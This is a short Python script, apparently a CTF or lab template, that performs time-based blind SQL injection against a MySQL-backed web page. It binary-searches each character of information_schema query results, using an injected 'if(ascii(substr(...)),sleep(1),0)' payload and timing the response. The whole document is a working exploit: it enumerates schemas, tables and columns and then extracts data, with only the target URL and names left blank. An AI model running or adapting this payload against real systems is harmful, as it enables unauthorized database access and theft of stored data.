import time
import requests

url=""
database="select group_concat(schema_name) from information_schema.schemata"
table="select group_concat(table_name) from information_schema.tables where table_schema=''"
column="select group_concat(column_name) from information_schema.columns where table_schema='' and table_name=''"
data="select '' from ''"

result=""
for i in range(1,150):
    k1=20
    k2=150
    mid=(k1+k2)//2
    while(k1<k2):
        payload='1" and if(ascii(substr(({}),{},1))>{},sleep(1),0)%23'.format(column,i,mid)
        stime=time.time()
        r=requests.get(url+payload)
        etime=time.time()
        if(etime-stime>=1):
            k1=mid+1
        else:
            k2=mid
        mid=(k1+k2)//2
    result=result+chr(mid)
    print(result)

